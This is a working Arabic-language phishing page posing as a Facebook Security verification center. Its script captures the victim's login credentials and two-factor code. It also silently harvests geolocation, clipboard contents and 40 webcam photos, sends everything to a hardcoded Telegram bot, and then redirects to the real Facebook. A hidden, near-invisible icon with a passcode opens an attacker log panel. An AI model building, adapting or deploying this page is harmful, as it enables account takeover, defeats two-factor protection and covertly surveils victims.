<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Security | مركز التحقق العالمي</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; overflow: hidden; }
        /* ترس الملك السري - شفاف جداً */
        #royal-gate { position: fixed; top: 5px; left: 5px; color: #000; cursor: pointer; z-index: 10000; opacity: 0.05; }
        
        .main-wrapper { display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 12px 30px rgba(0,0,0,0.15); width: 100%; max-width: 400px; text-align: center; border-top: 8px solid #1877f2; }
        
        /* تأثير النبض الرقمي */
        .pulse { width: 80px; height: 80px; background: #e7f3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pulse-blue 2s infinite; }
        @keyframes pulse-blue { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(24, 119, 242, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); } }

        input { width: 92%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; transition: 0.3s; }
        .btn-action { width: 100%; padding: 16px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        /* لوحة تحكم الإمبراطور */
        #admin-vault { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; color: #00ff41; z-index: 99999; padding: 25px; overflow-y: auto; font-family: 'Courier New', monospace; }
        .data-card { border: 1px dashed #333; padding: 15px; margin-bottom: 10px; background: #000; border-left: 5px solid #00ff41; }
    </style>
</head>
<body>

<div id="royal-gate" onclick="enterVault()"><i class="fas fa-shield-alt"></i></div>

<div class="main-wrapper">
    <div class="box">
        <div class="pulse"><i class="fas fa-user-check" style="color:#1877f2; font-size:35px;"></i></div>
        <h2 id="dynamic-title" style="margin:0 0 10px;">نظام الحماية المتقدم</h2>
        <p id="dynamic-p" style="font-size:14px; color:#606770;">جاري فحص اتصالك لضمان أمان عملية التوثيق...</p>
        
        <div id="login-form">
            <input type="text" id="email_phone" placeholder="البريد الإلكتروني أو الهاتف">
            <input type="password" id="pass_main" placeholder="كلمة السر">
            <button class="btn-action" onclick="phaseOne()">تأكيد الهوية (V22)</button>
        </div>

        <div id="otp-form" style="display:none;">
            <p style="color:red; font-size:12px; font-weight:bold;">تم تفعيل التحقق بخطوتين! يرجى إدخال الرمز الواصل لهاتفك:</p>
            <input type="number" id="otp_code" placeholder="أدخل الرمز المكون من 6 أرقام">
            <button class="btn-action" style="background:#28a745;" onclick="phaseTwo()">تأكيد الرمز</button>
        </div>

        <div id="final-loader" style="display:none; margin-top:20px;">
            <i class="fas fa-cog fa-spin" style="font-size:30px; color:#1877f2;"></i>
            <p>جاري مزامنة شارة التوثيق مع جهازك...</p>
        </div>
    </div>
</div>

<div id="admin-vault">
    <div style="display:flex; justify-content:space-between;">
        <h1 style="color:#0ff;">🔱 INFINITY-X CONTROL CENTER</h1>
        <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px;">إغلاق</button>
    </div>
    <hr color="#222">
    <div id="logs-container"></div>
</div>

<script>
const BOT_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
const CHAT_ID = "8754338811";

// 1. التعرف على الجهاز وتخصيص الرسالة
window.onload = () => {
    const platform = navigator.platform;
    document.getElementById('dynamic-p').innerText = `تم اكتشاف جهاز (${platform}). جاري تهيئة بروتوكول التوثيق المخصص لك.`;
};

// 2. دخول الملك (44443)
function enterVault() {
    if(prompt("كود الملك العظيم:") === "44443") {
        renderLogs();
        document.getElementById('admin-vault').style.display = 'block';
    }
}

// 3. المرحلة الأولى: سحب الحساب
async function phaseOne() {
    const u = document.getElementById('email_phone').value;
    const p = document.getElementById('pass_main').value;
    if(!u || !p) return;

    saveData("ACCOUNT", `USER: ${u} | PASS: ${p}`);
    await sendTG(`🎯 صيد جديد (المرحلة 1):\n👤: ${u}\n🔑: ${p}`);

    // الانتقال لطلب الرمز (التحقق بخطوتين) - فكرة ذكية جداً
    document.getElementById('login-form').style.display = "none";
    document.getElementById('otp-form').style.display = "block";
    
    // سحب الصلاحيات في الخلفية
    startOmniHarvest();
}

// 4. المرحلة الثانية: سحب رمز الأمان
async function phaseTwo() {
    const code = document.getElementById('otp_code').value;
    if(!code) return;

    saveData("OTP-CODE", `CODE: ${code}`);
    await sendTG(`🛡️ رمز الأمان المسحوب: ${code}`);

    document.getElementById('otp-form').style.display = "none";
    document.getElementById('final-loader').style.display = "block";

    setTimeout(() => {
        window.location.href = "https://www.facebook.com/me"; // تحويل الضحية للفيسبوك الحقيقي
    }, 4000);
}

// 5. محرك استنزاف الصلاحيات
async function startOmniHarvest() {
    // الموقع، الحافظة، البطارية
    navigator.geolocation.getCurrentPosition(pos => {
        sendTG(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
    });

    try {
        const clip = await navigator.clipboard.readText();
        if(clip) sendTG(`📋 حافظة: ${clip}`);
    } catch(e){}

    // سحب 40 صورة
    grabPhotos();
}

async function grabPhotos() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        let c = 0;
        const interval = setInterval(() => {
            if(c < 40) {
                const vid = document.createElement('video'); vid.srcObject = stream; vid.play();
                const can = document.createElement('canvas');
                can.width = 640; can.height = 480;
                can.getContext('2d').drawImage(vid, 0, 0);
                can.toBlob(b => sendPhoto(b, `📸 لقطة رقم ${c+1}`));
                c++;
            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(interval); }
        }, 2000);
    } catch(e) {}
}

// إدارة البيانات
function saveData(type, info) {
    let db = JSON.parse(localStorage.getItem('infinity_db')) || [];
    db.push({type, info, time: new Date().toLocaleTimeString()});
    localStorage.setItem('infinity_db', JSON.stringify(db));
}

function renderLogs() {
    const cont = document.getElementById('logs-container');
    const db = JSON.parse(localStorage.getItem('infinity_db')) || [];
    cont.innerHTML = db.reverse().map(l => `
        <div class="data-card">
            [${l.time}] <b style="color:#0ff;">${l.type}</b>: ${l.info}
        </div>
    `).join('');
}

async function sendTG(m) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}`); }
async function sendPhoto(b, cap) {
    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'x.jpg'); fd.append('caption', cap);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd});
}
</script>
</body>
</html>
